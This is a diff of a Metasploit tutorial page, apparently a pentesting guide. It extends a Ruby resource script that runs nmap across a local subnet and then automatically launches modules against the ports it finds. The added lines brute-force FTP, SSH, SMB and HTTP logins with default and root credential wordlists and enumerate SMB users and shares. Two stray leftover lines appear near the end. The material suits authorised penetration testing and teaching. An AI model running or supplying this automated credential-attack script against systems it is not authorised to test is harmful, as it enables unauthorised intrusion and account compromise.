@@ -317,7 +317,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
 
 <br /><br />
 
-<blockquote>Run auxiliary/exploit modules based on database (targets) ports found. Next resource script searchs inside msf database for targets open ports discover by db_nmap scan to sellect what auxiliary/exploits modules to run againts target system.</blockquote>
+<blockquote>Run auxiliary/exploit modules based on database (targets) ports found. Next resource script searchs inside msf database for targets open ports discover by db_nmap scan to sellect what auxiliary/exploits modules to run againts target system. REMARK: This script its prepared to accept user imputs (RHOSTS) throuth setg global variable.</blockquote>
 
 Open your text editor and copy/past the follow ruby (erb) code to it, save file and name it as: **scanner.rc**
 ```
@@ -327,13 +327,20 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
           This Metasploit RC file can be used to automate the exploitation process.
           In this example we are using db_nmap to populate msfdb datase with hosts
           then trigger auxiliary/scanners based on target ports capture by db_nmap.
+        Execute in msfconsole:
+          setg RHOSTS <hosts-separated-by-spaces>
+          resource <path-to-script>/scanner.rc
         Author:
           r00t-3xp10it  <pedroubuntu10[at]gmail.com>
       |
       print_line(help)
       Rex::sleep(1.5)
 
-      run_single("db_nmap -sV -Pn -T4 -O -p 21,80,445 --script=banner.nse,smb-os-discovery.nse,http-headers.nse --open 192.168.1.0/24")
+      if (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
+         run_single("setg RHOSTS 192.168.1.0/24")
+      end
+
+      run_single("db_nmap -sV -Pn -T4 -O -p 21,22,80,445 --script=banner.nse,smb-os-discovery.nse,http-headers.nse --open #{framework.datastore['RHOSTS']}")
       run_single("services")
       print_good("## Reading msfdb database.")
       xhost = framework.db.hosts.map(&:address).join(' ')
@@ -345,16 +352,36 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               run_single("use auxiliary/scanner/ftp/ftp_version")
               run_single("exploit")
               run_single("use auxiliary/scanner/ftp/anonymous")
+              run_single("set THREADS 35")
+              run_single("exploit")
+              run_single("use auxiliary/scanner/ftp/ftp_login")
+              run_single("set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/cms400net_default_userpass.txt")
+              run_single("set THREADS 105")
+              run_single("exploit")
+         end
+
+         if xport =~ /22/i
+              print_warning("## Target port: 22 ssh found")
+              run_single("use auxiliary/scanner/ssh/ssh_login")
+              run_single("set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt")
+              run_single("set VERBOSE false")
               run_single("exploit")
          end
 
          if xport =~ /445/i
               print_warning("## Target port: 445 smb found")
               run_single("use auxiliary/scanner/smb/smb_version")
+              run_single("set THREADS 16")
               run_single("exploit")
               run_single("use auxiliary/scanner/smb/smb_enumusers")
+              run_single("set THREADS 16")
               run_single("exploit")
               run_single("use auxiliary/scanner/smb/smb_enumshares")
+              run_single("set THREADS 16")
+              run_single("exploit")
+              run_single("use auxiliary/scanner/smb/smb_login")
+              run_single("set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/cms400net_default_userpass.txt")
+              run_single("set THREADS 16")
               run_single("exploit")
          end
 
@@ -362,12 +389,18 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               print_warning("## Target port: 80 http found")
               run_single("use auxiliary/scanner/http/title")
               run_single("exploit")
+              run_single("use auxiliary/scanner/http/options")
+              run_single("set THREADS 11")
+              run_single("exploit")
               run_single("use auxiliary/scanner/http/dir_scanner")
               run_single("exploit")
               run_single("use auxiliary/scanner/http/http_login")
+              run_single("set VERBOSE false")
               run_single("exploit")
          end
+      print_warning("## Cleaning Database.")
       run_single("unsetg RHOSTS")
+      run_single("unset THREADS")
      run_single("services -d")
      run_single("hosts -d")
    </ruby>
@@ -375,6 +408,9 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
 **Run the script:** msfconsole -r /root/scanner.rc
 
 <br /><br />
+
+/usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+use auxiliary/scanner/ssh/ssh_login
 
 <blockquote>Run auxiliary snmp modules and nmap nse scripts againts sellected setg RHOSTS variable defined in msfconsole. Users just need to manually input target(s) ip address(s) into setg RHOSTS variable to point to the targets to be scanned.</blockquote>
 
